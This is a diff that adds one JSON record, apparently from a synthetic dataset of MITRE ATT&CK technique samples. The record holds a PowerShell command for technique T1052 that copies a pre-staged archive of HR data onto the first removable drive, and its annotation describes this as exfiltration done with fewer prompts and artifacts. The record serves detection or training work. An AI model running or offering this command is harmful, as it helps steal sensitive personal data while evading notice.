@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1052",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$dl=(Get-Volume | Where-Object {$_.DriveType -eq 'Removable'} | Select-Object -First 1 -ExpandProperty DriveLetter); Expand-Archive -Path \"C:\\Temp\\HR.zip\" -DestinationPath \"$dl:\\Media\\HR\" -Force",
+  "explanation": "Expands a pre-staged ZIP archive of sensitive HR data directly onto a removable drive, writing exfiltration data offline.",
+  "rationale_steps": [
+    "Identify the removable drive letter.",
+    "Extract a local ZIP archive onto the USB device.",
+    "Force overwrite to minimize prompts and artifacts."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1052-5d877001-58bee9a0",
+  "source_prompt_hash": "5d877001",
+  "timestamp_utc": "2025-09-30T05:25:30.107478Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
